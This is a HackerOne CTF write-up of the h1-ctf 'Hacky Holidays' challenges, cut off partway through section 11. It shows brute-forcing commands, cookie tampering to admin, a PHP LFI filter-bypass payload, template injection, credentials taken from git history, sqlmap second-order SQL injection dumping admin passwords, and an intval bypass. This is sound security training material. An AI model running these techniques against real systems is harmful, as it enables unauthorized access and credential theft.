{"id":1067090,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY3MDkw","url":"https://hackerone.com/reports/1067090","title":"Mission completed. Grinch Networks is down and Christmas saved.","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-12-27T17:48:22.109Z","submitted_at":"2020-12-27T17:48:22.151Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yso","url":"/yso","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/VP4vgtKMVsQkH3usE51Nnb8B/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-12T18:02:35.193Z","bug_reporter_agreed_on_going_public_at":"2021-01-11T22:56:04.242Z","team_member_agreed_on_going_public_at":"2021-01-12T18:02:35.071Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi, I decided to create a good writeup, but for that I'd need some time, that's why I am submitting this pre-report now, and the actual report I ll submit before the deadline in this thread, right under this one.\n\nHere is some proof that Grinch Networks is down:\nhackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709\nflag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\n\nStay tuned!\n\n## Impact\n\nCritical","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-02-10T22:56:04.298Z","allow_singular_disclosure_after":-20960728.206064302,"singular_disclosure_allowed":true,"vote_count":1,"voters":["yso"],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":59882,"asset_type":"URL","asset_identifier":"hackyholidays.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10245707,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Executive Summary:\nThis year Mr Grinch has gone hi-tech and decided to ruin our Christmas, but thanks to a threat intelligence team we have got to know his intentions and therefore we put up a special Incident Response team just for this case. After a couple of days of hard work, the IR team successfully infiltrated his network and took him down just right on Christmas eve. \n\n# Technical Summary:\nDuring the assessment IR team identified and exploited the following weaknesses and vulnerabilities:\n1. Information Disclosure through files for web crawlers\n2. Information Disclosure through javascript files\n3. Insecure direct object reference\n4. Information Disclosure due to lack of Authentication control\n5. User Enumeration and Password Enumeration due to descriptive messages. Weak credentials\n6. Source code exposure. Weak filter bypass that leads to PHP LFI.\n7. Directory listing and SSTI\n8. Source code leakage with secrets through an open git repository. Weak password usage.\n9. Second-order SQL Injection\n10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privileges.\n11. Double SQL Injection and Path Traversal\n12. Insecure cryptographic salt usage. The predictive  algorithm used. DNS Rebinding attack\n\n\n# Detailed explanation of issues and walk through:\n\n## 1.  Information Disclosure through files for web crawlers\nThe default web crawler files like robots.txt or humans.txt sometimes may contain valuable to attackers information (e.g. hidden directories, which are difficult to brute force).\n### Steps to reproduce\n  * Launch the following command            \n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 80 -x txt,php\n```\n  * In the output you should be able to find robots.txt\n  * Open a browser and navigate to the following link https://hackyholidays.h1ctf.com/robots.txt\n{F1140069}\n\n### Key takeaways\nIn the real world, it is not an issue on its own and would definitely need a context in order to be a valid security issue. It might be used in a chain of vulnerabilities/missing of best practices and weaknesses.\n\n## 2.  Information Disclosure through javascript files\nSometimes developers modify legacy Javascript code for debugging purposes, but they tend to forget to remove it before the release. The issue sometimes may lead to information disclosure of sensitive content, the same as it was in our story. IR team followed the hidden link `/s3cr3t-ar3a` and discovered that `assets/js/jquery.min.js` was modified and it contained the code that printed sensitive flag in the HTML document.\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a\n  * Press Ctrl+U . HTML source code should be shown. \n  * Now find a script `/assets/js/jquery.min.js`\n  * Download the script using this command `wget https://hackyholidays.h1ctf.com/assets/js/jquery.min.js`\n  * unminify the js code by using this command: `js-beautify -o jquery.js jquery.min.js`\n  * Look at the first 50 lines of the file: `head -n 50 jquery.js`\n  * Find references to h1_0, h1_2 variables. After analysing this piece of code we understand that we have to look for `alertbox` on the page using developer tools. Alternatively, we can change JS code a bit and execute it in order to get the flag,\n  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a again\n  * Open Developer Tools by pressing Ctrl+Schift+I \n  * Click on Inspector on the Developer Tools toolbar, and try to search for `#alertbox`\n  * We should be able to find our flag data-info parameter. \n\n{F1140070}\n\n### Supporting Material/References:\n\n### Key takeaways\nIn the real world, it is pretty common to find and analyze JS files, especially those which are custom. A tool such as js-beautify and a mindset for finding interesting or strange code is essential for such weaknesses. \n\n## 3. Insecure direct object reference\nAfter navigating to https://hackyholidays.h1ctf.com/apps, which was a hinted location in the JS file at the second stage, we find eight different buttons. Each button is a link to another mini-app that IR team had to crack during the hunt for a secret area portal. The first target was people-rater mini-app. \n\nAfter navigating to https://hackyholidays.h1ctf.com/people-rater , IR Team intercepted two GET requests. One of them was representing `/people-rater/page/1` and the second one was `people-rater/entry?id=eyJpZCI6Mn0=`. The first endpoint was returning JSON file with a list of `{\"id\":\"base64_encoded_value\", name:\"Name\"}`. Then the Team had to enumerate each page by increasing and decreasing the number in the request. Thanks to that it became evident that `/people-rater/page/1` is the first page. \n\nSecondly, IRT decoded the first base64 encoded value `eyJpZCI6Mn0=` , which contained `{\"id\":2}`. After that the logic was simple - we had to send a base64 encoded value of  `{\"id\":1}` to `people-rater/entry?id=` \n\n### Steps to reproduce\n  * Set up a proxy like Burp Suite or ZAP\n  * Navigate to https://hackyholidays.h1ctf.com/people-rater\n  * Go to the Burp Suite. Find the request to `/people-rater/page/0`\n{F1140071}\n  * Base64 decode `eyJpZCI6Mn0=`. You should get `{\"id\":2}`\n{F1140072}\n  * Decrease the id by 1 and base64 encode it. You should get `eyJpZCI6MX0=`\n  * Now send a GET request to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=\n{F1140073}\n\n### Key takeaways\nAlways look into each parameter and assume something may be hidden\n\n## 4. Information Disclosure due to lack of Authentication control\nAs always, the first step was to study the app itself. The app had an interesting functionality that s\net a `token` cookie when the user entered a valid username and password that led us to look into\nhow we could sing in.\n\nThe default endpoint bruteforce gave us a few endpoints, such as `/api/purchase` and `/api/sessions`. But in order to discover all endpoints a negative status code filter should have been used. This interesting technique gave us another endpoint - `/api/user`, which returned a 400 error.\n\nThe `/api/sessions` endpoint returned a list of sessions, where only one was interesting. And thanks\nto what we discovered before, we knew that it should be used inside a `token` cookie.\n\nBut it wasn't the end, so that's why we decided to brute-force parameters on `/api/user`, and that gav\ne us an `uuid` parameter, the same parameter which was found in session, so all we had to do in order\n to get a flag is to send a request to `/api/user` endpoint with a session token in a cookie and a parameter `uuid` which value was taken from the session token.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/swag-shop\n  * Find request to api endpoints and initiate a scan of the api endpoint. (don't forget to change the directory)\n\n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 60 -b 404\n```\n\n{F1140075}\n  * Got to the Burp Suite, do a request to swag-shop/api/user\n\n```\nGET /swag-shop/api/user HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1GET\n```\n\n  * Then bruteforce a parameter on /swag-shop/api/user endpoint\n\n```\nwfuzz --hc 400 -w ~/Tools/lists/SecLists/Discovery/Web-Content/burp-parameter-names.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1\n```\n\n   * Do a GET request to swag-shop/api/sessions  and find a list of sessions. copy the third one (the longest)\n\n```\neyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\n```\n\n{F1140076}\n   * Decode the longest session token. It should decode to \n\n```\n{\"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"}\n```\n   * The place a token to a Cookie header `Cookie: token=[TOKEN]` and copy UUID from the token and place it into `uuid` parameter. Send the request.\n\n```\nGET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: token=eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\nReferer: https://hackyholidays.h1ctf.com/apps\nUpgrade-Insecure-Requests: 1\n```\n\n{F1140077}\n\n### Supporting Material/References:\n\n### Key takeaways\nSometimes one should fuzz using a negative match, not just a default setup.\n\n\n## 5. User Enumeration and Password Enumeration due to descriptive messages. Weak credential\nThis app had a strange error saying `Invalid Username`, when we tried to login, that's why we decided\n to bruteforce the usernames and hope that the app would return another descriptive error for a passo\nword. Here it should be noted that mostly everyone fell in a trap by not assuming that `Invalid Usern\name` and `Invalid Password` have the same length.\n\nIndeed it if you bruteforce by first filtering out `Invalid Username` and thenfiltering out `Invalid\nPassword` - you get `access:computer`.\n\nAfter successfully signing in, the server issued a `securelogin` cookie that contained a base64 encod\ned value of a cookie parameter and admin parameter, which was set to false. Apperently, no checks wer\ne implemented, and just by changing `\"admin\":false` to `\"admin\":true` did the trick and we became an\nadmin.\n\nOn the admin page we found a zip file accessible for download. Unfortunately it was password protecte\nd, but a tool like `zip2john` helped to get a hash of the password ready for a bruteforce using `john\n`. The password is easy - `hahahaha`. Using it, we unzipped a zip file and got a flag.\n\n\n### Steps to reproduce\n  * Navigate to  and send a login request using username: user and password pass. Observe a descriptive error `Invalid Username`\n  * Start a username brute-force attack. You should get a username: access\n\n```\nwfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Usernames/Names/names.txt -d 'username=FUZZ\u0026password=pass' --hs 'Invalid\\ Username'\n```\n\n{F1140086}\n  * Go to the login page in the browser again and send a login request using username: access and password pass. Observe a descriptive error `Invalid Password`\n  * Start a password brute-force attack. You should get a password: computer\n\n```\nwfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Passwords/Common-Credentials/10k-most-common.txt -d 'username=access\u0026password=FUZZ' --hs 'Invalid\\ Password'\n```\n\n  * Intercept requests using Burp Suite, go the login page and authenticate youself using `access` as a username and `computer` as a password.\n  * Send that request to Repeater and send it to the host again. You should get a redirect with setting a cookie\n\n```\nSet-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;\n```\n\n  * URL- and base64- decode the cookie and you should get\n\n```\n{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}\n```\n\n  * Change admin parameter to `true`, url- and base64- decode the cookie. After that send a GET request to /secure-login with the new cookie.\n\n```\nGET /secure-login HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://hackyholidays.h1ctf.com/secure-login\nConnection: close\nCookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d\nUpgrade-Insecure-Requests: 1\n\n```\n\n{F1140085}\n  * In the Response you can find a link to `/my_secure_files_not_for_you.zip` file\n  * Grab ZIP file - https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip\n  * If you try to open with the old password - you'll fail. So we have to use `john2zip` in order to create a hash, that we will brute\n\n```\n~/Tools/john/run/zip2john my_secure_files_not_for_you.zip \u003e encrypted.zip.hash\n```\n\n  * Then execute the actual brute-force command\n\n```\n~/Tools/john/run/john encrypted.zip.hash --wordlist=/home/strawberry/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt\n```\n\n  * The password that you'll get is - `hahahah`. Use it to open either using GUI or using this command\n\n```\nunzip unzip my_secure_files_not_for_you.zip\n```\n\n  * cat the flag.txt. Note it's better not to see xxx.png file)\n{F1140084}\n\n### Supporting Material/References:\n\n### Key takeaways\nSometimes the grep is better than checking just the size, because the error could be the same length as what you are trying to filter out.\n\n## 6. Source code exposure. Weak filter bypass that leads to PHP LFI.\nAfter opening an app, we saw a template parameter setting `entries.html`. The endpoint bruteforce showed us that the app is written in php, and the file that is being executed as default is `index.php`.\nThat led us to an idea to include `index.php` in `template` parameter, which gave us its source-code.\n\nAfter studying a source-code, I discovered that there are `admin.php` and `secretadmin.php` files tha\nt are our targets. Also there are checks implemented, but truth to say they are weak, e.g. `str_repla\nce` function that replaces only the first occurance with the empty string, so that `admadmin.php.php` will become `admin.php`\n\nFollowing that way, I constructed a payload - `secretadminsecretadadmin.phpmin.php.php` that resulted\n into `secretadmin.php` after all replacements. That way we included a `secretadmin.php` source code\nand got our flag\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/my-diary\n  * Notice template parameter and change it to index.php e.g. https://hackyholidays.h1ctf.com/my-diary/?template=index.php (You should get code of index.php)\n{F1140087}\n  * Read the code, understand the logic\n  * Construct a payload that bypasses protections.\n  * Send a request with the payload - https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadadmin.phpmin.php.php\n{F1140088}\n  * Get the flag\n\n### Supporting Material/References:\n\n### Key takeaways\nNever use one-time replacing function, where you need recursion.\n\n## 7. Directory listing and SSTI\nHate-mail-generator is some campaign creation mini app, that has an example, that was created for us. The example contains template braces like `{{name}}`, which is replaced by `Bob` in preview mode. Al\nso an example has `{{template:cbdj3_grinch_header.html}}`, which is being replace by HTML code found\nin this template.\n\nBruteforcing directories gave us a `/templates` directory. Directory listing on this directory gave us a new template `38dhs_admins_only_header.html`, but unfortunately the tempalate is not accessible directly.\n\nBut thanks to Mr Grinch, because he left us an ability to create and preview our own campaigns. After\n intercepting the request we saw that `preview_data` parameter is being supplied with `preview_markup\n`, where preview_data contained a json with the keys and values that are reflected in the campaign me\nssage.\n\nThis all led us to injection of a template `{{template:38dhs_admins_only_header.html}}` as the value\nof `name` key in `preview_data`, also where `preview_markup` was including `{{name}}`. That way we tr\nicked an application to firstly fetch the template code and secondly reflect it in our variable.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/hate-mail-generator\n  * Start a brute force of directories (you should find templates directory.\n\n```\n~/go/bin/gobuster https://hackyholidays.h1ctf.com/hate-mail-generator/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40\n```\n\n{F1140092}\n  * Click on `Guess What` (https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030)     \n{F1140090}\n  * Look at the markup, copy this part `{{template:cbdj3_grinch_header.html}}`\n{F1140091}\n  * Go back. And click on `Create New` (https://hackyholidays.h1ctf.com/hate-mail-generator/new)\n  * Set up a Burp Suite Proxy.\n  * Enter a name, subject and add our copied markup. Click on `preview`\n  * Intercept the request and send it to repeater. Notice preview_data parameter which decodes to `{\"name\":\"Alice\",\"email\":\"alice@test.com\"}`\n  * Go to https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and copy 38dhs_admins_only_header.html\n  * In Repeater change preview_data parameter content to `{\"name\":\"{{template:38dhs_admins_only_header.html}}\",\"email\":\"alice@test.com\"}`\n  * Send a new request\n\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 210\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/hate-mail-generator/new\nUpgrade-Insecure-Requests: 1\n\npreview_markup=Hello+%7B%7Bname%7D%7D+....+%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D\u0026preview_data=%7B%22name%22%3A%22{{template:38dhs_admins_only_header.html}}%22%2C%22email%22%3A%22alice%40test.com%22%7D\n```\n\n{F1140093}\n  *  Get your flag\n\n### Supporting Material/References:\n\n### Key takeaways\nAlways try different injection points, like preview_markup and preview_data, not just one\n\n## 8. Source code leakage with secrets through open git repository. Weak password usage.\nThe next task was solved with some luck, as I had to ask help from Google, by googling `grinch networks forum` and clicking on a 5th link, which redirected me to the github page of a creater of this CTF\n. The strange thing was, that the `forum` repository was open, but wasn't listed in repository column\n, only that it was the last repository to which adamtlangley created a commit.\n\nI cloned the repository, and used `git` tool to look through the history of commits. One commit was s\nuspicious - `small fix`. After scrolling a bit I found credentials `forum` as username and `6HgeAZ0qC9T6CQIqJpD` as password.\n\nThe credentials were used on `/phpmyadmin` endpoint, which then led to getting md5 hash of grinch pas\nsword. Bruteforcing the password locally with the help of hashcat gave nothing, but I decided to chec\nk the hash using online service, that have much bigger hash:password collections than I do. And indee\nd, using crackstation.net, cmd5.ru or another service gave a passowrd - `BahHumbug`.\n\nLogging into grinch account gives us powers to look into secret messages and grab the flag.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/forum\n  * Brute-force directories. It should find an interesting `phpmyadmin` directory\n\n```\n~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/forum/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40\n```\n\n  * Look for `grinch networks forum` in Google\n{F1140101}\n  * Navigate to the fifth result - https://github.com/adamtlangley\n  * If we study the first page, we'll notice `Grinch-Networks/forum` repository\n  * Clone the repository, check history of commits and look into an interesting commit\n\n```\ngit clone https://github.com/Grinch-Networks/forum\ncd forum\ngit log\ngit log -p -2\n```\n\n{F1140102}\n  * After scrolling down, you should find a line with credentials `self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`\n  * Use credentials to authenticate yourself on `phpmyadmin` endpoint\n  * Click on `forum`, then on `user` . (https://hackyholidays.h1ctf.com/forum/phpmyadmin/?db=forum\u0026table=user)  \n\n{F1140103}\n  * Copy the hash of Mr Grinch. `35D652126CA1706B59DB02C93E0C9FBF`\n  * Use online service like crackstation.net to find a clear-text password. The password is - `BahHumbug`\n  * Now login to `grinch` account using password `BahHumbug` using the first login page - https://hackyholidays.h1ctf.com/forum/login\n{F1140104}\n  * Navigate to https://hackyholidays.h1ctf.com/forum/3/2\n{F1140105}\n  * Get the flag\n\n### Supporting Material/References:\n\n### Key takeaways\nClose repositories and delete history! If you attack, then look for open repos and look at commit history.\n\n## 9. Second-order SQL Injection\nEvil-quiz was pretty easy. In order to prove that we have a SQL Injection I had to create 2 different accounts, the first name was `admin\"` and the second name was `admin'`. After submiting a quiz we we\nre redirected to the score page, where in the first case we had at least 1 user with the same name, a\nnd in the second case we always had 0 users with the same name. Even after I create another user with\n a name `admin'` - the number didn't change, it was still 0.\n\nThat meant, that the application was quering a database for usernames like the one we supplied and co\nunting them. The query failed and the resulting number was 0.\n\nIn order to exploit this second-order SQL Injection we had to make sqlmap differentiate between what's a true answer and what's not, because the size of the response doesn't change. `--regexp` argument\nhelped us to match all values that didn't match `There is 0 other player(s) with the same name as you\n!`, but matched the same line with different number like 1,5,242, etc.\n\nThen it was just a matter of time when we get the credentials. After we got them, we just logged in and got a flag.\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz\n  * Set name to `admin\"`, finish the quiz and note the answer on a score page.\n\n```\nThere is 1 other player(s) with the same name as you!\n```\n\n{F1140108}\n  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz again\n  * Set name to `admin'`, finish the quiz and note the answer on a score page.\n\n```\nThere is 0 other player(s) with the same name as you!\n```\n\n{F1140109}\n{F1140110}\n  * As it's definitely a second order sql injection we would like to check it and dump DB quickly. For that intercept 2 requests (POST to /evil-quiz with name parameter and GET to /evil-quiz/score)  and save them to files first.req, second.req \n\nfirst.req\n\n```\nPOST /evil-quiz HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 56\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nCookie: session=b4d9476eed4279882950934fdad25595;\nReferer: https://hackyholidays.h1ctf.com/evil-quiz\nUpgrade-Insecure-Requests: 1\n\nname=admin*\n\n```\n\nsecond.req\n\n```\nGET /evil-quiz/score HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/evil-quiz/start\nCookie: session=b4d9476eed4279882950934fdad25595;\nUpgrade-Insecure-Requests: 1\n\n```\n\n  * Now send use this sqlmap command. Answers to questions - Y,Y,N,N\n\n```\nsudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\\(s\\)' \n```\n\n  * Now dump a table with admin and password\n\n```\nsudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\\(s\\)' -D quiz -T admin --dbms=mysql --dump\n```\n\n```\n| id | username | password          |\n+----+----------+-------------------+\n| 1  | admin    | S3creT_p4ssw0rd-$ |\n+----+----------+-------------------+\n```\n\n{F1140112}\n  * Login to https://hackyholidays.h1ctf.com/evil-quiz/admin using found credentials\n  * Get the flag\n\n### Supporting Material/References:\n\n### Key takeaways\nLook for strange behaviour and check it twice with different accounts.\n\n## 10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privilege\nThe signup-manager was different from other apps, in a way that we had to study source-code, that we\ngot because of the developer comment in html file.\n\nIt was clear, that all we had to do is to overflow some part of the string in order to add at least o\nne character to it and set the last character of `lastname` as `Y`. That way, we would become an admin user.\n\nAll parameters were interesting, but the password and token are md5 hashes and we cannot change their character length. username, lastname and firstname are being checked and only first 15 characters ar\ne taken from them. But there is an `age` parameter that isn't being stripped into 15 character, but r\nather it's checked whether it is numeric, whether it's more than 3 characters and is casted into an i\nnteger value.\n\nThe function that are being used are `is_numeric` and `intval`. After reading their documentation it'\ns clear that we can supply characters in different notation, e.g. in scientific one, so that our valu\ne would bypass `is_numeric` and `strlen` check, but would casted in much bigger integer by `intval`.\n\nThat's why we supplied 1e3 which is 1*10^3 = 1000 as the value of age argument. And that's how we got\n a flag, and got to know about a new endpoint - `/r3c0n_server_4fdk59`\n\n### Steps to reproduce\n  * Navigate to https://hackyholidays.h1ctf.com/signup-manager/\n  * Look at HTML source code. Ctrl+U . Find a comment with README.md\n{F1140113}\n  * Download a readme file https://hackyholidays.h1ctf.com/signup-manager/README.md\n  * Read the file. Download and unzip https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip\n\n```\nwget https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip\nunzip signupmanager.zip\n```\n\n  * You'll have to analyze the source code.     \n{F1140114}\n  * The most interesting and right part of the source code is:\n\n```\nif (!is_numeric($_POST[\"age\"])) {\n       $errors[] = 'Age entered is invalid';\n}\nif (strlen($_POST[\"age\"]) \u003e 3) {\n       $errors[] = 'Age entered is too long';\n}\n$age = intval($_POST[\"age\"]);\n\n```\n\n  * After reading the docs, we notice that there are insufficient checks implemented:\nhttps://www.php.net/manual/en/function.is-numeric.php\nhttps://www.php.net/manual/en/function.intval.php\n  * We are able to send a number in a scientific notation like `1e3` (means 1*10^3), that helps us to bypass the check on more than 3 characters and set admin privileges for ourselves.\n  * Send the following POST request to the target\n\n```\nPOST /signup-manager/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 137\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/signup-manager/\nUpgrade-Insecure-Requests: 1\n\naction=signup\u0026username=username_urqxn\u0026password=pass\u0026age=1e3\u0026firstname=YYYYYYYYYYYYYYYYYYYYYYYYYYYY\u0026lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n```\n\n{F1140115}\n  * The application will set a `token`. If it's not set automatically, copy it and set it manually and send another request\n\n```\nGET /signup-manager/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: token=9e9354b6c3a1f5e7686813daf14ac4b5;\nOrigin: https://hackyholidays.h1ctf.com\nConnection: close\nReferer: https://hackyholidays.h1ctf.com/signup-manager/\nUpgrade-Insecure-Requests: 1\n\n```\n\n{F1140116}\n  * Get the flag and discover a new endpoint - `/r3c0n_server_4fdk59`\n\n### Key takeaways\nSearch for developer comments. Read the documentation of functions.\n\n## 11 Double SQL Injection and Path traversal\nRecon server was a bit hard due to it's rather new technique for me. Firstly I found a SQL Injection in a hash parameter of `/album` endpoint, but it didn't give much at first. Only after I decided to c\nheck other parts of an app, I found that there is another endpoint - `/picture` that fetches a images\n from `/uploads` directory. The value of a parameter used in picture endpoint is b64 encoded and cont\nains a path and an auth md5 token, which is being checked and just changing the path value gives noth\ning.\n\nThe default page said that an API is being developed, and after finding an `/api` 